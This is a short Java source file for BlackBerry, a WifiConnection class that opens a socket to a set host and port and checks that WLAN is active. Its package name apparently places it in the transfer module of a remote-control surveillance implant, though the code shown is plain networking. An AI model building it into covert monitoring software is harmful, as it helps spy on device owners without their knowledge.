package com.ht.rcs.blackberry.transfer;

import java.io.IOException;

import javax.microedition.io.Connector;
import javax.microedition.io.StreamConnection;

import net.rim.device.api.system.RadioInfo;
import net.rim.device.api.system.WLANInfo;

import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class WifiConnection extends Connection {
    static Debug debug = new Debug("Wifi", DebugLevel.VERBOSE);

    private String host_;
    private int port_;

    private int timeout = 3 * 60 * 1000;

    // Constructor
    public WifiConnection(String host, int port) {
        host_ = host;
        port_ = port;
    }

    public synchronized boolean connect() {
        String url = "socket://" + host_ + ":" + port_ + ";ConnectionTimeout="
                + timeout;
        ;

        try {
            connection_ = (StreamConnection) Connector.open(url);
            in_ = connection_.openDataInputStream();
            out_ = connection_.openDataOutputStream();

            Check.ensures(connection_ != null, "connection_ null");
            Check.ensures(in_ != null, "in_ null");
            Check.ensures(out_ != null, "out_ null");

            connected_ = true;
        } catch (IOException e) {
            connected_ = false;
        }

        return connected_;
    }

    protected void error(String string) {
        debug.error(string);
    }

    public synchronized boolean isActive() {
        boolean active = (RadioInfo.getActiveWAFs() & RadioInfo.WAF_WLAN) != 0;
        boolean connected = WLANInfo.getWLANState() == WLANInfo.WLAN_STATE_CONNECTED;

        debug.info("Active: " + active + " Connected: " + connected);
        return connected && active;
    }

    protected void trace(String string) {
        debug.trace(string);
    }

}
